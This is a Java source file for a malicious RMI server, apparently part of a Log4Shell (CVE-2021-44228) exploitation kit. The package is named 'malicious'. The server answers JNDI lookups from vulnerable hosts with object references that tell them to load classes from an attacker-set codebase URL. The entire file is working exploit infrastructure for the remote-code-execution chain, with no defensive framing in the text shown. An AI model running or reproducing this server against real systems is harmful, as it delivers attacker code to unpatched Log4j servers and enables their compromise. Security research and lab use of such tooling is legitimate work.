package es.malvarez.log4shell.malicious.rmi;

import es.malvarez.log4shell.malicious.MaliciousProperties;
import lombok.RequiredArgsConstructor;
import lombok.extern.log4j.Log4j2;
import org.springframework.context.ApplicationContext;
import org.springframework.core.annotation.AnnotationUtils;
import org.springframework.core.task.TaskExecutor;
import org.springframework.stereotype.Component;
import sun.rmi.transport.TransportConstants;

import javax.annotation.PostConstruct;
import javax.annotation.PreDestroy;
import javax.net.ServerSocketFactory;
import java.io.BufferedInputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.ObjectStreamClass;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.net.URLClassLoader;
import java.rmi.MarshalException;
import java.rmi.server.ObjID;
import java.rmi.server.UID;
import java.util.Map;
import java.util.TreeMap;
import java.util.concurrent.TimeUnit;
import java.util.stream.Collectors;

@Component
@Log4j2
@RequiredArgsConstructor
public class RmiServer {

    private final MaliciousProperties properties;

    private final TaskExecutor taskExecutor;

    private final ApplicationContext context;

    private final Map<String, RmiController> routes = new TreeMap<>();

    private ServerSocket server;

    private boolean exit = false;

    @PostConstruct
    public void start() {
        try {
            routes.putAll(createRoutes());
            server = createServer();
            taskExecutor.execute(this::accept);
            log.info("Listening on port {}", properties.getRmiPort());
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    @PreDestroy
    public void end() throws IOException {
        exit = true;
        server.close();
        server = null;
    }

    private ServerSocket createServer() throws IOException {
        return ServerSocketFactory.getDefault().createServerSocket(properties.getRmiPort());
    }

    private Map<String, RmiController> createRoutes() {
        return context.getBeansWithAnnotation(RmiRoute.class)
                .values()
                .stream()
                .collect(Collectors.toMap(this::getRoute, RmiController.class::cast));
    }

    private String getRoute(final Object object) {
        RmiRoute route = AnnotationUtils.findAnnotation(object.getClass(), RmiRoute.class);
        return route.route();
    }

    private void accept() {
        try {
            while (!this.exit) {
                Socket client = this.server.accept();
                if (client != null) {
                    taskExecutor.execute(() -> handle(client));
                }
            }
        } catch (Exception e) {
            throw new RuntimeException(e);
        } finally {
            if (this.server != null) {
                try {
                    this.server.close();
                } catch (IOException e) {
                    // ignore close exception
                }
            }
        }
    }

    private void handle(final Socket client) {
        try {
            InetSocketAddress remote = (InetSocketAddress) client.getRemoteSocketAddress();
            log.info("Received connection from {}", remote);
            client.setSoTimeout((int) TimeUnit.SECONDS.toMillis(5));
            InputStream is = client.getInputStream();
            InputStream buff = is.markSupported() ? is : new BufferedInputStream(is);
            buff.mark(4); // read initial data
            try (DataInputStream in = new DataInputStream(buff)) {
                int magic = in.readInt();
                short version = in.readShort();
                if (magic != TransportConstants.Magic || version != TransportConstants.Version) {
                    return;
                }
                try (DataOutputStream out = new DataOutputStream(client.getOutputStream())) {
                    byte protocol = in.readByte();
                    switch (protocol) {
                        case TransportConstants.StreamProtocol:
                            handleStreamProtocol(remote, in, out);
                        case TransportConstants.SingleOpProtocol:
                            handleMessage(in, out);
                            break;
                        default:
                            throw new RuntimeException("Unsupported protocol " + protocol);
                    }
                    out.flush();
                }
            }
        } catch (Exception e) {
            throw new RuntimeException(e);
        } finally {
            try {
                client.close();
            } catch (IOException e) {
                // ignore close exception
            }
        }
    }

    private void handleStreamProtocol(final InetSocketAddress remote, final DataInputStream in, final DataOutputStream out) throws IOException {
        out.writeByte(TransportConstants.ProtocolAck);
        if (remote.getHostName() != null) {
            out.writeUTF(remote.getHostName());
        } else {
            out.writeUTF(remote.getAddress().toString());
        }
        out.writeInt(remote.getPort());
        out.flush();
        in.readUTF();
        in.readInt();
    }

    private void handleMessage(final DataInputStream in, final DataOutputStream out) throws Exception {
        int op = in.read();
        switch (op) {
            case TransportConstants.Call:
                handleCall(in, out);
                break;
            case TransportConstants.Ping:
                out.writeByte(TransportConstants.PingAck);
                break;
            case TransportConstants.DGCAck:
                UID.read(in);
                break;
            default:
                throw new IOException("unknown transport op " + op);
        }
    }

    private void handleCall(final DataInputStream in, final DataOutputStream out) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(in) {
            @Override
            protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
                if ("[Ljava.rmi.server.ObjID;".equals(desc.getName())) {
                    return ObjID[].class;
                } else if ("java.rmi.server.ObjID".equals(desc.getName())) {
                    return ObjID.class;
                } else if ("java.rmi.server.UID".equals(desc.getName())) {
                    return UID.class;
                } else if ("java.lang.String".equals(desc.getName())) {
                    return String.class;
                }
                throw new IOException("Not allowed to read object");
            }
        };
        ObjID read;
        try {
            read = ObjID.read(ois);
        } catch (Exception e) {
            throw new MarshalException("unable to read objID", e);
        }
        if (read.hashCode() == 2) {
            handleDGC(ois);
        } else if (read.hashCode() == 0) {
            handleRMI(ois, out);
        }
    }

    private void handleRMI(ObjectInputStream ois, DataOutputStream out) throws Exception {
        int method = ois.readInt();
        ois.readLong();
        if (method != 2) {
            return;
        }
        String object = (String) ois.readObject();
        log.info("Received lookup for {}", object);
        out.writeByte(TransportConstants.Return);
        try (ObjectOutputStream oos = new MarshalOutputStream(out, this.properties.getCodeBase())) {
            oos.writeByte(TransportConstants.NormalReturn);
            new UID().write(oos);
            RmiController controller = findController(object);
            oos.writeObject(controller.buildReference(object));
            oos.flush();
            out.flush();
        }
    }

    private RmiController findController(final String object) {
        return routes.entrySet().stream()
                .filter(entry -> object.startsWith(entry.getKey()))
                .findFirst()
                .map(Map.Entry::getValue)
                .orElseThrow(() -> new IllegalArgumentException("No route found for " + object));
    }

    private static void handleDGC(final ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ois.readInt();
        ois.readLong();
        ois.readObject();
    }

    private static final class MarshalOutputStream extends ObjectOutputStream {

        private final URL sendUrl;

        private MarshalOutputStream(final OutputStream out, final URL u) throws IOException {
            super(out);
            this.sendUrl = u;
        }

        @Override
        protected void annotateClass(Class<?> cl) throws IOException {
            if (this.sendUrl != null) {
                writeObject(this.sendUrl.toString());
            } else if (!(cl.getClassLoader() instanceof URLClassLoader)) {
                writeObject(null);
            } else {
                URL[] us = ((URLClassLoader) cl.getClassLoader()).getURLs();
                StringBuilder cb = new StringBuilder();
                for (URL u : us) {
                    cb.append(u.toString());
                }
                writeObject(cb.toString());
            }
        }

        @Override
        protected void annotateProxyClass(Class<?> cl) throws IOException {
            annotateClass(cl);
        }
    }
}
